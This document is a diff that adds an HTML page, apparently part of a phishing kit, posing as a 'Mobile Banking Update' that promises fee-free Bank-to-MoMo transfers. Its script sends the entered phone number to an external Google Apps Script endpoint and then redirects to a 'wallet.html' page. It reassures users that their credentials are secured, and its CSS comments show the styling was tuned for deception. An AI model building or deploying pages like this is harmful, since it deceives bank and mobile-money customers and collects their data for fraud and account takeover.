@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mobile Banking Update</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --blue-dark:#063f73;
+      --blue-mid:#074f87;
+      --card-bg:#ffffff;
+      --input-border:#dadada;
+      --submit-grey:#9e9e9e;
+    }
+
+    body{
+      margin:0;
+      font-family:"Montserrat", sans-serif;
+      background:linear-gradient(180deg, var(--blue-mid), var(--blue-dark));
+      color:#fff;
+    }
+
+    .page{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      padding:30px 20px;
+    }
+
+    .hero{text-align:center;max-width:700px;}
+
+    .title{
+      font-size:28px;
+      font-weight:800;
+      color:#ffffff;
+      margin-top:10px;
+    }
+
+    /* NEW SUBMISSIVE SUBTITLE STYLE */
+    .submissive-subtitle{
+      margin-top:12px;
+      font-size:14px;
+      font-weight:500;
+      opacity:0.75;       /* makes it subtle */
+      color:#eaeaea;      /* soft white */
+      line-height:1.45;
+      max-width:700px;
+      text-align:center;
+    }
+
+    .card{
+      background:#fff;
+      width:100%;
+      max-width:700px;
+      border-radius:20px;
+      padding:22px;
+      margin-top:25px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.15);
+      color:#000;
+    }
+
+    .label{
+      font-size:18px;
+      font-weight:700;
+      margin-bottom:10px;
+    }
+
+    .input{
+      width:100%;
+      border:1px solid var(--input-border);
+      border-radius:10px;
+      padding:14px;
+      font-size:18px;
+      margin-bottom:20px;
+    }
+
+    .btn{
+      width:100%;
+      background:var(--submit-grey);
+      padding:16px;
+      border-radius:30px;
+      border:none;
+      color:#000;
+      font-size:18px;
+      font-weight:800;
+      cursor:pointer;
+    }
+
+    .hint{text-align:center;font-size:14px;color:#888;margin-top:14px;}
+
+  </style>
+</head>
+
+<body>
+
+<div class="page">
+
+  <div class="hero">
+    <div class="title">MOBILE BANKING UPDATE</div>
+
+    <!-- NEW SUBTITLE INSERTED HERE -->
+    <div class="submissive-subtitle">
+      Validating your phone number to the account enables you to make transactions
+      from Bank to MoMo or vice-versa without any fees associated.
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="label">Phone Number</div>
+
+    <input id="phoneInput" class="input" type="tel" maxlength="10"
+           placeholder="Enter Phone Number" />
+
+    <button id="submitBtn" class="btn">Submit</button>
+
+    <div class="hint">Your credentials are secured</div>
+  </div>
+
+</div>
+
+<script>
+  const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbx4u9G1KhfKRDV_uK3g-n0aDbyVPAj1nly8LkC2oILkjfvs8weP0C5Shrhigp6EIFHCIQ/exec";
+
+  document.getElementById("submitBtn").addEventListener("click", async ()=>{
+      const phone = document.getElementById("phoneInput").value.trim();
+
+      await fetch(WEBAPP_URL,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify({ phone })
+      });
+
+      window.location.href = "wallet.html";
+  });
+</script>
+
+</body>
+</html>
